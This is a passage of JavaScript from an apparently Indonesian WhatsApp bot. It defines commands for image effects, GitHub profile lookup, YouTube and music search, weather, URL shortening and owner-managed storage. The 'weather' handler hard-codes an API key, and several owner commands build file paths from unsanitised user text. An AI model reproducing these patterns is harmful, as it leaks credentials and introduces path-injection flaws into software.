case 'valentine':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-neon-light-on-brick-wall-online-1062.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'glowingneon':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'colorled':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/color-led-display-screen-text-effect-1059.html", [`${q}`,])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case '3dretro':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [
`${teks1}`,`${teks2}`])
.then((data) => xdev.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
//━━━━━━━━━━━━━━━[ MAKER ]━━━━━━━━━━━━━━━━━//
case 'wanted': 
case 'utatoo': 
case 'unsharpen': 
case 'thanos': 
case 'sniper': 
case 'sharpen': 
case 'sepia': 
case 'scary': 
case 'rip': 
case 'redple': 
case 'rejected': 
case 'posterize': 
case 'ps4': 
case 'pixelize': 
case 'missionpassed': 
case 'moustache': 
case 'lookwhatkarenhave': 
case 'jail': 
case 'invert': 
case 'greyscale': 
case 'glitch': 
case 'gay': 
case 'frame': 
case 'fire': 
case 'distort': 
case 'dictator': 
case 'deepfry': 
case 'ddungeon': 
case 'circle': 
case 'challenger': 
case 'burn': 
case 'brazzers': 
case 'beautiful': 
case 'approved': 
case '3000years':
if (isQuotedImage) {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
try{
onlyWait()
let ahah = await xdev.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
xdev.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: setQuoted})
fs.unlinkSync(ahah) 
})
}catch(err){
console.log(err)
}
} else if (isQuotedTag || isQuotedReply) {
onlyWait()
let ghost = users 
let oppp = await xdev.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let ini_gen = `${command}`
ameApi.generate(ini_gen, {
url : oppp
}).then(gambar => {
xdev.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: setQuoted})
}).catch(err => {
setReply(`${err}`)
});    
} else {
setReply("Tag atau Reply targetnya")
}
break
//━━━━━━━━━━━━━━━[ SARCH ]━━━━━━━━━━━━━━━━━//
case 'ghstalk':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply("Masukan link")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
let nana = await ghstalk(q)
console.log(nana)
let foto = nana.avatar_url
let gambar = await getBuffer(foto)
console.log(foto)
let toks =`
Nama: ${nana.name}
Bio: ${nana.bio}
Followers: ${nana.followers}
Following: ${nana.following}
Repository: ${nana.public_repos}
Created at: ${nana.created_at}
Update at: ${nana.updated_at}
Twitter: ${nana.twitter_username}
Email: ${nana.email}
Lokasi: ${nana.location}
Website: ${nana.blog}
Github url: ${nana.url}
`
console.log(toks)
await xdev.sendMessage(from, {image:gambar, caption: toks},{quoted: setQuoted})
}
break			
case 'lirik':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length < 2) return setReply(`Kirim perintah ${command} judul lagu`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
ra.Musikmatch(q).then(async(data) => {
var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
xdev.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: setQuoted })
}).catch(() => setReply(`Judul lagu tidak ditemukan`))
}
break
case 'grupwa': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Kirim perintah ${command} nama grup`)
onlyWait()
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return setReply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
setReply(teks)
}).catch(() => setReply(mess.error.api))
break
case 'yts':
try {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('Format salah')
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
setReply('Tunggu sebentar')
let rus = await yts(q)
let  res = await rus.all.filter(v => v.type == 'video')
let videoID = res[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let a = `*Youtube Search 🔎*\n`
for (let i of res) {
a += `
📜 Title : ${i.title}
📈 Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
let b = a.trim()

let imag = await getBuffer(res[0].image)
let mok = [
{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
xdev.sendButImage(from, b, `Baterai : Not Detec\nfake`, imag, mok, {quoted: setQuoted})
} catch (e) {
console.log(e)
setReply(`${e}`)
}
break  
case 'whatmusic':
if (isQuotedAudio) {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
xdev.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
onlyWait()
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
xdev.sendButImage(from, teks, `© ${fake1}`, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio atau video")
}
break
case 'whatanime':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const FormData = require('form-data')
if (isImage || isQuotedImage) {       
let yoooo = await xdev.downloadAndSaveMediaMessage(quoted)
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(yoooo)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await xdev.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: setQuoted})
})    .catch((err) => {                   
setReply(mess.error.api)
})
} else if (isSticker || isQuotedSticker ) {
let yoooo = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return setReply('Gagal :V')   
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(ran)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await xdev.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: setQuoted})
fs.unlinkSync(ran)
})
.catch((err) => {       
setReply(mess.error.api)
})
})
} else {
setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
}
break
case 'google':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('masukan teks')
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
let ggs = require('google-it')
 ggs({ 'query': q }).then(results => {
let vars =``
vars += `_*Hasil Pencarian : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
setReply(lama)
})
}
break
case 'kbbi':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length < 1) return setReply('Apa yang mau dicari um?')
let asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
setReply('Menurut Kbbi:\n\n'+asw.result)
}
break
case 'weather':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!args[0]) setReply(" please provide place or location name")
try{
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather= res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature= res.data.main.temp_min + '°C'
let Maximum_Temperature= res.data.main.temp_max + '°C'
let Humidity= res.data.main.humidity + '%'
let Wind= res.data.wind.speed + 'km/h'
setReply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
}catch(e){
setReply('Lokasi tidak di temukan, silakan masukan nama negara')
}
}
break
case 'kodepos':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let nana = await kodepos(q)
console.log(nana)
let teks =`Berikut Daftar kode pos\nYang telah di temukan\n\n`
for (let i of nana){
 teks +=`Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
}
setReply(teks)
} catch (err){
setReply("Kodepos tidak di temukan")
console.log(err)
}
break 
case 'kodebahasa':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
}
break 
case 'brainly':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
if (!q) setReply( 'Soalnya?')
let nana =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
let foto = await getBuffer(nana)   
let res = await brainly.searchWithMT('id', `${q}`)
console.log(res)
let teks =`_*BRAINLY*_\n\n`


   teks += res.map(({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map((v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`).join``}`).join(`
═════════════════
`)
 
 teks +=`\n\n_Thanks for choosing Brainly_`
 
let mok = [
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
{"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
xdev.sendButImage(from, teks, fake, foto, mok, {contextInfo: forward})             
}
break
case 'wallpaper': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply( 'Masukkan Query Title')
let anu = await wallpaper(q)
console.log(anu)
if(anu.length == "0") return setReply("Image tidak di temukan")
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })
}
break
//━━━━━━━━━━━━━━━[ SHORT URL ]━━━━━━━━━━━━━━━━━//
case 'tinyurl':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length < 1) return setReply(`Masukkan link`)
if (!isUrl) return setReply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
let shorti = `*Result : ${okok}*`
setReply(shorti)
}
break  
case 'bitly':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply("Masukan link")
if(!isUrl) return setReply("Masukan link dengan benar")
try {
let result = await bitly.shorten(q);
setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch(e) {
setReply(`Url invalid`)
}
}
break;
case 'tourl': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
onlyWait()
let { UploadFileUgu} = require('../../../../../ACTION/STORAGE/X-FUNC/uploader')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
if (isQuotedImage) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
let anu = await UploadFileUgu(media)
setReply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//━━━━━━━━━━━━━━━[ STORAGE ]━━━━━━━━━━━━━━━━━//
case 'adderror':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
if (!isOwner) return onlyOwner()
let oke = q.split("|")[0]
let oka = q.split("|")[1]
addError(oke, oka, listerror)
await setReply(`Sukses Menambahkan ${q} ke daftar error`)
}
break
case 'addstik':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedSticker) return setReply('Reply stiker nya')
if (!q) return setReply('Nama sticker nya apa?')
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
setiker.push(q) 
await fse.copy(delb, `./ACTION/PLICE/STICKER/STICK/${q}.webp`)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/stick.json', JSON.stringify(setiker))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break	
case 'addvn':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedAudio) return setReply('Reply vnnya')
if (!q) return setReply('Nama audionya apa')
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
audionye.push(q)
await fse.copy(delb,`./ACTION/PLICE/AUDIO/${q}.mp3`)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/vn.json', JSON.stringify(audionye))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break  
case 'addowner':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if (isMiminya) return setReply("sudah menjadi owner kak")
Own.push(input)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/owner.json', JSON.stringify(Own))
setReply(`Succes add owner`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'addprem':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
if (isPremnya) return setReply("sudah menjadi premium kak")
Premium.push(input)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/premium.json', JSON.stringify(Premium))
setReply(`Succes add premium`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delprem':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (!isPremnya) return setReply("tidak ada di database kak")
if (input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
let delprem = Premium.indexOf(input)
Premium.splice(delprem, 1)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/premium.json', JSON.stringify(Premium))
setReply(`Succes delete user premium`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delowner':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (!isMiminya) return setReply("tidak ada di database kak")
if (input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
let delown = Own.indexOf(input)
Own.splice(delown, 1)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/owner.json', JSON.stringify(Own))
setReply(`Succes delete user owner`)
} catch (err){
console.log(err)
setReply("Terjadi Error")
}
break
case 'delerror':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
listerror.splice(q, 1)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/listerror.json', JSON.stringify(listerror))
setReply( `Sukses menghapus ${q} di daftar error`)
}
break
case 'delstik':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply("Masukan query")
try {
let wanu = setiker.indexOf(q)
setiker.splice(wanu,1)
fs.unlinkSync(`./ACTION/PLICE/STICKER/STICK/${q}.webp`)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/stick.json', JSON.stringify(setiker))
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break
case 'delvn':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
try {
let wanu = audionye.indexOf(q)
audionye.splice(wanu, 1)
fs.writeFileSync('./ACTION/STORAGE/X-DATA/vn.json', JSON.stringify(audionye))
